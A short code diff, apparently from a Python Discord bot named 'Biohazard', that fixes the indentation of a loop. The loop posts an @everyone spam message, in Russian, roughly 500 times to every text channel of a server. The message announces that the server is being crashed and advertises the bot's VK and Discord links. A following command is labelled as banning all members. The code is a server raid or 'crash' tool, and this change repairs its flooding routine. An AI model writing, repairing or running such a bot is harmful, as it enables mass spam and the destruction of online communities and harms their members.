@@ -85,8 +85,8 @@ class MyClient(discord.Client):
 				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC'
 				await message.delete()
 				while s <= 500:
-				for channel in message.guild.text_channels:
-					await channel.send(spam)
+					for channel in message.guild.text_channels:
+						await channel.send(spam)
 						s = s + 1
 			if message.content == '*всембан': #бан всех участников
 				await message.delete()
